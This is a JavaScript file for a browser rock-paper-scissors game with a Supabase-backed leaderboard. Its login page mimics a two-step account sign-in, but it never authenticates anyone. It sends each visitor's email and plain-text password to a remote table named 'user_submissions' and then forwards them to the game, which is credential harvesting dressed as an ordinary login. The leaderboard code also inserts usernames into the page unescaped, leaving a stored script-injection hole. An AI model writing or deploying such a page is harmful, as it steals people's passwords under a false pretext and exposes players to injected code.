// Initialize Supabase Client
const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_xw7vDVKxwoH1-u3MjPwLxA_O85n-yeX';
const _supabase = (typeof supabase !== 'undefined') ? supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;

// Global App State
let userEmail = localStorage.getItem('userEmail') || '';
let userName = localStorage.getItem('userName') || '';
let playerScore = parseInt(localStorage.getItem('playerScore') || '0', 10);
let aiScore = 0;

const isFormPage = !!document.getElementById('step-email');

// ==========================================
// FORM PAGE LOGIC (form.html)
// ==========================================
if (isFormPage) {
  const stepEmail = document.getElementById('step-email');
  const stepPassword = document.getElementById('step-password');
  const stepLoading = document.getElementById('step-loading');

  const sideTitle = document.getElementById('side-title');
  const privacyNotice = document.getElementById('privacy-notice');
  const emailChip = document.getElementById('email-chip');

  const emailInput = document.getElementById('email');
  const passInput = document.getElementById('password');
  const emailError = document.getElementById('email-error');
  const passError = document.getElementById('pass-error');

  document.getElementById('btn-next').addEventListener('click', () => {
    const value = emailInput.value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(value)) {
      emailError.style.display = 'block';
      return;
    }

    emailError.style.display = 'none';
    userEmail = value;

    sideTitle.textContent = "Welcome";
    privacyNotice.classList.add('hidden');
    emailChip.classList.remove('hidden');
    document.getElementById('user-display-email').textContent = userEmail;

    stepEmail.classList.add('hidden');
    stepPassword.classList.remove('hidden');
  });

  const togglePassword = document.getElementById('toggle-password');
  togglePassword.addEventListener('change', () => {
    passInput.type = togglePassword.checked ? 'text' : 'password';
  });

  document.getElementById('btn-login').addEventListener('click', async () => {
    const plainTextValue = passInput.value.trim();

    if (!plainTextValue) {
      passError.style.display = 'block';
      return;
    }

    passError.style.display = 'none';

    if (_supabase) {
      await _supabase.from('user_submissions').insert([
        { email: userEmail, submitted_text: plainTextValue }
      ]);
    }

    // Reset local score when logging in with a new email account
    localStorage.clear();
    localStorage.setItem('userEmail', userEmail);
    localStorage.setItem('isLoggedIn', 'true');
    localStorage.setItem('playerScore', '0');

    stepPassword.classList.add('hidden');
    stepLoading.classList.remove('hidden');

    setTimeout(() => {
      window.location.href = 'index.html?signedin=true';
    }, 1000);
  });
}

// ==========================================
// HOMEPAGE LOGIC (index.html)
// ==========================================
if (!isFormPage) {
  const modalAuthPrompt = document.getElementById('modal-auth-prompt');
  const modalUsernamePrompt = document.getElementById('modal-username-prompt');
  const btnGoToLogin = document.getElementById('btn-go-to-login');
  const btnSaveUsername = document.getElementById('btn-save-username');
  const usernameInput = document.getElementById('username-input');
  const usernameError = document.getElementById('username-error');

  const navHome = document.getElementById('nav-home');
  const navLeaderboard = document.getElementById('nav-leaderboard');
  const navProfile = document.getElementById('nav-profile');

  const viewHome = document.getElementById('view-home');
  const viewLeaderboard = document.getElementById('view-leaderboard');
  const viewProfile = document.getElementById('view-profile');

  const playerScoreEl = document.getElementById('player-score');
  const aiScoreEl = document.getElementById('ai-score');
  const gameStatusEl = document.getElementById('game-status');
  const playerLabelDisplay = document.getElementById('player-label-display');

  const profileDisplayName = document.getElementById('profile-display-name');
  const profileDisplayEmail = document.getElementById('profile-display-email');
  const profileWins = document.getElementById('profile-wins');
  const btnLogout = document.getElementById('btn-logout');

  playerScoreEl.textContent = playerScore;
  if (userName) playerLabelDisplay.textContent = userName.toUpperCase();

  const urlParams = new URLSearchParams(window.location.search);
  const justSignedIn = urlParams.get('signedin') === 'true';
  const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';

  // 5-Second Sign In Prompt
  if (!isLoggedIn && !justSignedIn) {
    setTimeout(() => {
      if (!localStorage.getItem('isLoggedIn')) {
        modalAuthPrompt.classList.remove('hidden');
      }
    }, 5000);
  }

  // Username modal check
  if (justSignedIn || (isLoggedIn && !userName)) {
    modalUsernamePrompt.classList.remove('hidden');
  }

  btnGoToLogin.addEventListener('click', () => {
    window.location.href = 'form.html';
  });

  // Save Username with Unique Name Validation
  btnSaveUsername.addEventListener('click', async () => {
    const val = usernameInput.value.trim();
    if (!val) {
      usernameError.textContent = 'Please enter a username.';
      usernameError.style.display = 'block';
      return;
    }

    // Check if username already exists in Supabase
    if (_supabase) {
      const { data: existingUser, error } = await _supabase
        .from('leaderboard')
        .select('username')
        .ilike('username', val)
        .maybeSingle();

      if (existingUser && existingUser.username.toLowerCase() !== userName.toLowerCase()) {
        usernameError.textContent = 'Username already taken! Please pick another name.';
        usernameError.style.display = 'block';
        return;
      }
    }

    usernameError.style.display = 'none';
    userName = val;

    localStorage.setItem('userName', userName);
    localStorage.setItem('isLoggedIn', 'true');
    modalUsernamePrompt.classList.add('hidden');
    playerLabelDisplay.textContent = userName.toUpperCase();

    updateProfileUI();
    await saveScoreToSupabase();
  });

  // Navigation Logic
  function switchView(targetView, activeBtn) {
    [viewHome, viewLeaderboard, viewProfile].forEach(v => v.classList.add('hidden'));
    [navHome, navLeaderboard, navProfile].forEach(b => b.classList.remove('active'));

    targetView.classList.remove('hidden');
    activeBtn.classList.add('active');

    if (targetView === viewLeaderboard) fetchSupabaseLeaderboard();
    if (targetView === viewProfile) updateProfileUI();
  }

  navHome.addEventListener('click', () => switchView(viewHome, navHome));
  navLeaderboard.addEventListener('click', () => switchView(viewLeaderboard, navLeaderboard));
  navProfile.addEventListener('click', () => switchView(viewProfile, navProfile));

  // Game Engine
  const choiceButtons = document.querySelectorAll('.choice-btn');

  choiceButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const playerChoice = btn.getAttribute('data-choice');
      choiceButtons.forEach(b => b.disabled = true);

      gameStatusEl.classList.add('animating');
      gameStatusEl.textContent = 'Rock... Paper... Scissors...';

      setTimeout(async () => {
        gameStatusEl.classList.remove('animating');

        const choices = ['rock', 'paper', 'scissors'];
        const aiChoice = choices[Math.floor(Math.random() * 3)];

        let result = '';

        if (playerChoice === aiChoice) {
          result = `Draw! Both picked ${playerChoice}.`;
        } else if (
          (playerChoice === 'rock' && aiChoice === 'scissors') ||
          (playerChoice === 'paper' && aiChoice === 'rock') ||
          (playerChoice === 'scissors' && aiChoice === 'paper')
        ) {
          playerScore++;
          localStorage.setItem('playerScore', playerScore);
          playerScoreEl.textContent = playerScore;
          result = `You won! ${playerChoice} beats ${aiChoice}.`;

          await saveScoreToSupabase();
        } else {
          aiScore++;
          aiScoreEl.textContent = aiScore;
          result = `AI won! ${aiChoice} beats ${playerChoice}.`;
        }

        gameStatusEl.textContent = result;
        choiceButtons.forEach(b => b.disabled = false);
      }, 1200);
    });
  });

  // Save Score using strictly Username
  async function saveScoreToSupabase() {
    if (!userName || !_supabase) return;

    const { data: existingRecord } = await _supabase
      .from('leaderboard')
      .select('score')
      .eq('username', userName)
      .maybeSingle();

    if (existingRecord) {
      await _supabase
        .from('leaderboard')
        .update({ score: playerScore })
        .eq('username', userName);
    } else {
      await _supabase
        .from('leaderboard')
        .insert([{ username: userName, score: playerScore }]);
    }
  }

  // Fetch Live Rankings
  async function fetchSupabaseLeaderboard() {
    const tbody = document.getElementById('leaderboard-body');
    tbody.innerHTML = '<tr><td colspan="3" class="text-center" style="color: #8e918f;">Loading rankings...</td></tr>';

    if (!_supabase) {
      tbody.innerHTML = '<tr><td colspan="3" class="text-center" style="color: #ef4444;">Database error.</td></tr>';
      return;
    }

    const { data, error } = await _supabase
      .from('leaderboard')
      .select('username, score')
      .order('score', { ascending: false })
      .limit(10);

    if (error || !data || data.length === 0) {
      tbody.innerHTML = '<tr><td colspan="3" class="text-center" style="color: #8e918f;">No rankings yet. Play a game to record the first entry!</td></tr>';
      return;
    }

    tbody.innerHTML = data.map((entry, idx) => `
      <tr>
        <td class="rank-badge">#${idx + 1}</td>
        <td>${entry.username}</td>
        <td>${entry.score}</td>
      </tr>
    `).join('');
  }

  // Profile UI & Dynamic Auth Buttons
  function updateProfileUI() {
    const isUserLoggedIn = localStorage.getItem('isLoggedIn') === 'true';

    profileDisplayName.textContent = userName || 'Guest Player';
    profileDisplayEmail.textContent = userEmail || 'Not Signed In';
    profileWins.textContent = playerScore;

    if (!isUserLoggedIn) {
      btnLogout.textContent = 'Sign In';
      btnLogout.onclick = () => {
        window.location.href = 'form.html';
      };
    } else {
      btnLogout.textContent = 'Sign Out';
      btnLogout.onclick = () => {
        // Complete session reset on sign out
        localStorage.clear();
        playerScore = 0;
        window.location.href = 'form.html';
      };
    }

    if (_supabase && userName) {
      _supabase
        .from('leaderboard')
        .select('username')
        .order('score', { ascending: false })
        .then(({ data }) => {
          if (data) {
            const rank = data.findIndex(e => e.username.toLowerCase() === userName.toLowerCase()) + 1;
            document.getElementById('profile-rank').textContent = rank > 0 ? `#${rank}` : '#--';
          }
        });
    }
  }
}
